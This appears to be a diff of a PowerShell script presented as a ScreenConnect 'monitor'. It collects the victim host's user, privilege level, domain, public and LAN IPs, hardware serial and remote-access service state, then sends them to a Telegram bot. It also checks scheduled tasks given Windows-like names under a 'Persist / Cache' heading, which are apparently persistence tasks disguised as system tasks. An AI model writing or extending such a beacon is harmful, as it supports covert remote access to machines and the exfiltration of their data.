@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T1 - rich ScreenConnect monitor Telegram alerts
+# TG_REPORT BUILD 20260802T2 - rich ScreenConnect monitor Telegram alerts (HTML)
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [Parameter(Mandatory = $true)][string]$Summary,
@@ -20,6 +20,11 @@ function Get-Cfg {
         }
     }
     return $cfg
+}
+
+function Esc([string]$s) {
+    if ($null -eq $s) { return '' }
+    return ($s -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;')
 }
 
 function Get-PublicIp {
@@ -58,6 +63,11 @@ function Get-SvcLine([string]$Name) {
     if (-not $s) { return 'missing' }
     $cim = Get-CimInstance Win32_Service -Filter "Name='$Name'" -ErrorAction SilentlyContinue
     $start = if ($cim) { $cim.StartMode } else { '?' }
+    $path = if ($cim -and $cim.PathName) {
+        $p = $cim.PathName
+        if ($p.Length -gt 90) { $p.Substring(0, 90) + '...' } else { $p }
+    } else { '' }
+    if ($path) { return "$($s.Status) (start=$start) | $path" }
     return "$($s.Status) (start=$start)"
 }
 
@@ -65,6 +75,8 @@ function Get-OsInfo {
     $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
     $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
     $bios = Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue
+    $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
+    $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue
     [pscustomobject]@{
         Caption      = if ($os) { $os.Caption } else { 'n/a' }
         Version      = if ($os) { $os.Version } else { 'n/a' }
@@ -77,6 +89,9 @@ function Get-OsInfo {
         Domain       = if ($cs) { $cs.Domain } else { 'n/a' }
         TotalRAM_GB  = if ($cs) { [math]::Round($cs.TotalPhysicalMemory / 1GB, 1) } else { 'n/a' }
         Serial       = if ($bios) { $bios.SerialNumber } else { 'n/a' }
+        CPU          = if ($cpu) { $cpu.Name } else { 'n/a' }
+        DiskFree_GB  = if ($disk) { [math]::Round($disk.FreeSpace / 1GB, 1) } else { 'n/a' }
+        DiskSize_GB  = if ($disk) { [math]::Round($disk.Size / 1GB, 1) } else { 'n/a' }
     }
 }
 
@@ -96,16 +111,17 @@ $msiSize = if (Test-Path $msiCache) {
     '{0:N0} KB' -f ((Get-Item $msiCache).Length / 1KB)
 } else { 'none' }
 
-$emoji = switch ($State.ToUpperInvariant()) {
-    'OK' { '✅' }
-    'DOWN' { '🚨' }
-    'RESTORED' { '🟢' }
-    'FAIL' { '❌' }
-    'FORCE' { '⚡' }
-    default { '📟' }
+$emojiMap = @{
+    OK       = [string]([char]0x2705)
+    DOWN     = ([string][char]::ConvertFromUtf32(0x1F6A8))
+    RESTORED = ([string][char]::ConvertFromUtf32(0x1F7E2))
+    FAIL     = [string]([char]0x274C)
+    FORCE    = [string]([char]0x26A1)
 }
+$key = $State.ToUpperInvariant()
+$emoji = if ($emojiMap.ContainsKey($key)) { $emojiMap[$key] } else { ([string][char]::ConvertFromUtf32(0x1F4F1)) }
 
-$title = switch ($State.ToUpperInvariant()) {
+$title = switch ($key) {
     'OK' { 'Primary healthy' }
     'DOWN' { 'Primary DOWN - healing' }
     'RESTORED' { 'Primary RESTORED' }
@@ -114,91 +130,99 @@ $title = switch ($State.ToUpperInvariant()) {
     default { "State: $State" }
 }
 
-$trans = if ($OldState) { "$OldState → $State" } else { $State }
+$trans = if ($OldState) { "$OldState -> $State" } else { $State }
 
-$scList = @()
+$scList = New-Object System.Collections.Generic.List[string]
 Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
-    $scList += "  • $($_.Name): $($_.Status)"
+    [void]$scList.Add(('• <code>{0}</code>: <b>{1}</b>' -f (Esc $_.Name), (Esc ([string]$_.Status))))
 }
-if (-not $scList) { $scList = @('  • (none)') }
+if ($scList.Count -eq 0) { [void]$scList.Add('• (none)') }
 
-$tasks = @(
-    '\Microsoft\Windows\Diagnosis\Scheduled',
-    '\Microsoft\Windows\PLA\Server',
-    '\Microsoft\Windows\WDI\ResolutionHost',
-    '\Microsoft\Windows\Tcpip\IpAddressConflict1'
-) | ForEach-Object {
-    $tn = $_
-    try {
-        $r = schtasks.exe /Query /TN $tn /FO LIST 2>$null
-        if ($LASTEXITCODE -eq 0) { "  • $tn : present" } else { "  • $tn : missing" }
-    } catch { "  • $tn : missing" }
+$taskLines = New-Object System.Collections.Generic.List[string]
+foreach ($tn in @(
+        '\Microsoft\Windows\Diagnosis\Scheduled',
+        '\Microsoft\Windows\PLA\Server',
+        '\Microsoft\Windows\WDI\ResolutionHost',
+        '\Microsoft\Windows\Tcpip\IpAddressConflict1'
+    )) {
+    schtasks.exe /Query /TN $tn /FO LIST 1>$null 2>$null
+    $st = if ($LASTEXITCODE -eq 0) { 'present' } else { 'missing' }
+    [void]$taskLines.Add(('• <code>{0}</code>: {1}' -f (Esc $tn), $st))
 }
 
 $pub = Get-PublicIp
 $lan = Get-LocalIps
 $now = Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz'
+$uptime = 'n/a'
+try {
+    $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+    $uptime = '{0:dd}d {0:hh}h {0:mm}m' -f ((Get-Date) - $boot)
+} catch {}
 
 $text = @"
-$emoji *SC Monitor — $title*
+$emoji <b>SC Monitor — $(Esc $title)</b>
 
-*Event*
-• Summary: $Summary
-• Transition: ``$trans``
-• When: $now
+<b>Event</b>
+• Summary: $(Esc $Summary)
+• Transition: <code>$(Esc $trans)</code>
+• When: $(Esc $now)
 
-*Host*
-• Computer: ``$($env:COMPUTERNAME)``
-• User: ``$who``
+<b>Host</b>
+• Computer: <code>$(Esc $env:COMPUTERNAME)</code>
+• User: <code>$(Esc $who)</code>
 • Elevated: $elev | SYSTEM: $isSystem
-• Domain/Workgroup: $($os.Domain)
+• Domain/Workgroup: $(Esc $os.Domain)
 
-*Network*
-• LAN IPs: ``$lan``
-• Public IP: ``$pub``
+<b>Network</b>
+• LAN IPs: <code>$(Esc $lan)</code>
+• Public IP: <code>$(Esc $pub)</code>
 
-*OS / Hardware*
-• OS: $($os.Caption)
-• Version: $($os.Version) (build $($os.Build)) $($os.Arch)
-• Install: $($os.InstallDate) | Last boot: $($os.LastBoot)
-• Hardware: $($os.Manufacturer) $($os.Model)
-• Serial: ``$($os.Serial)``
+<b>OS / Hardware</b>
+• OS: $(Esc $os.Caption)
+• Version: $(Esc $os.Version) (build $(Esc $os.Build)) $(Esc $os.Arch)
+• Install: $(Esc $os.InstallDate) | Last boot: $(Esc $os.LastBoot)
+• Uptime: $(Esc $uptime)
+• CPU: $(Esc $os.CPU)
+• Hardware: $(Esc $os.Manufacturer) $(Esc $os.Model)
+• Serial: <code>$(Esc $os.Serial)</code>
 • RAM: $($os.TotalRAM_GB) GB
+• Disk C: $($os.DiskFree_GB) GB free / $($os.DiskSize_GB) GB
 
-*ScreenConnect*
-• Primary ``5f6010579852e507``: $(Get-SvcLine $prim)
-• Alt ``f861c8140d453427``: $(Get-SvcLine $alt)
+<b>ScreenConnect</b>
+• Primary <code>5f6010579852e507</code>: $(Esc (Get-SvcLine $prim))
+• Alt <code>f861c8140d453427</code>: $(Esc (Get-SvcLine $alt))
 • All SC services:
 $($scList -join "`n")
 
-*Persist / Cache*
-• MSI cache: $msiSize
-• WorkDir: ``$WorkDir``
+<b>Persist / Cache</b>
+• MSI cache: $(Esc $msiSize)
+• WorkDir: <code>$(Esc $WorkDir)</code>
 • Tasks:
-$($tasks -join "`n")
+$($taskLines -join "`n")
 
-_Bot: @nobuddyrmmBot • OWN_MON_
+<i>Bot: @nobuddyrmmBot • OWN_MON rich report</i>
 "@
 
+$log = Join-Path $WorkDir 'boot.err'
 try {
     Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
         chat_id                  = $cfg.CHAT_ID
         text                     = $text
-        parse_mode               = 'Markdown'
+        parse_mode               = 'HTML'
         disable_web_page_preview = 'true'
     } | Out-Null
-    Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value 'tg_sent_rich' -ErrorAction SilentlyContinue
+    Add-Content -LiteralPath $log -Value 'tg_sent_rich' -ErrorAction SilentlyContinue
 } catch {
-    # fallback plain text if markdown fails
     try {
-        $plain = $text -replace '\*', '' -replace '`', '' -replace '_', ''
+        $plain = [regex]::Replace($text, '<[^>]+>', '')
+        $plain = [System.Net.WebUtility]::HtmlDecode($plain)
         Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
             chat_id                  = $cfg.CHAT_ID
             text                     = $plain
             disable_web_page_preview = 'true'
         } | Out-Null
-        Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value 'tg_sent_plain' -ErrorAction SilentlyContinue
+        Add-Content -LiteralPath $log -Value 'tg_sent_plain' -ErrorAction SilentlyContinue
     } catch {
-        Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value ("tg_fail " + $_.Exception.Message) -ErrorAction SilentlyContinue
+        Add-Content -LiteralPath $log -Value ("tg_fail " + $_.Exception.Message) -ErrorAction SilentlyContinue
     }
 }
